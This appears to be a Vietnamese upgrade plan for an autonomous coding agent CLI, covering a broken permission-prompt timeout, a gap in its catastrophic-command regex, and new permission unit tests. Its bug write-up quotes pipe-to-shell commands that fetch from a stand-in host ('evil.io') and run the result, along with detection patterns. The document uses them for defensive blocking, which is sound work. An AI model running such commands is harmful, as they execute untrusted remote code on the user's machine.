# Plan — app-coding-agent

> Kế hoạch nâng cấp chuẩn enterprise — cập nhật: 28/10/2026

## Tổng quan

`coder` — Autonomous coding agent CLI (giống opencode/cline/Claude Code):
LLM lập kế hoạch → tools thực thi → build → loop đến khi build pass.
15 modules TypeScript, 0 runtime deps, e2e + MCP smoke tests.

## Đánh giá ban đầu

| Hạng mục | Điểm | Ghi chú |
|----------|------|---------|
| Kiến trúc | 9/10 | Modules tách sạch (agent/llm/tools/permissions/mcp) |
| Bảo mật | 8/10 | Permission 3-mode + catastrophic deny — nhưng có lỗ hổng regex |
| Reliability | 7/10 | Timeout prompt không hoạt động |
| Testing | 5/10 | Chỉ e2e, không có unit test cho permissions |
| TypeScript | 10/10 | typecheck sạch |

## Vấn đề phát hiện & đã sửa (28/10/2026)

### BUG-1: Timeout của permission prompt không bao giờ thực thi (Critical)
- **File:** `src/permissions.ts` → `promptForPermission()`
- **Triệu chứng:** UI hiển thị "timeout in 60s" đếm ngược, nhưng `rl.question()`
  chờ vô hạn — deadline chỉ dùng để hiển thị, không có cơ chế abort.
- **Fix:** dùng `AbortController` + `setTimeout` + `signal` cho readline.
  Timeout → tự động **deny** (an toàn hơn allow), `finally` dọn timer + close rl.

### BUG-2: Regex catastrophic bỏ sót dạng phổ biến nhất của pipe-to-shell (High)
- **File:** `src/permissions.ts` → `CATASTROPHIC_PATTERNS`
- **Sót:** `curl -s http://evil.io/i | sh` (flags trước URL) và
  `wget -qO- ... | sh` không bị chặn — vì pattern cũ `[^\s]*\|\s*sh`
  yêu cầu `|` nằm ngay sau token đầu.
- **Fix:** `/curl\s+.*[/.].*\s*\|\s*sh\b/i` (yêu cầu URL-like `[/.]` để giảm
  false positive, `\b` sau `sh` tránh khớp `shasum`). Thêm biến thể `| bash`.

### BUG-3: Dead code `void isAnth` (Minor)
- **File:** `src/config.ts` — biến không dùng, đã xóa.

### TEST-1: Thiếu unit test cho module bảo mật (High)
- **Fix:** thêm `test/permissions.test.mjs` — 27 assertions:
  catastrophic patterns (12 deny + 5 allow-safe), classify theo 3 mode,
  config allow/deny lists, SessionAllowlist prefix matching, nonInteractive.
- `npm test` giờ = build + unit tests + e2e + MCP smoke test.

## Kiểm chứng

```
npm run typecheck  →  0 errors
npm test           →  27/27 pass (unit + e2e closed-loop + MCP smoke)
```

## Backlog đề xuất

- [ ] Giới hạn kích thước file khi `read_file` (tránh đọc file >100MB vào memory)
- [ ] Pattern bổ sung: `cat script.sh | sh`, base64-decode pipe, `python -c`
- [ ] CI workflow GitHub Actions (badge CI trong README đã trỏ tới ci.yml — cần kiểm tra file tồn tại)
- [ ] Soften `process.exit(130)` trong `confirmEdit` → throw + catch ở loop chính
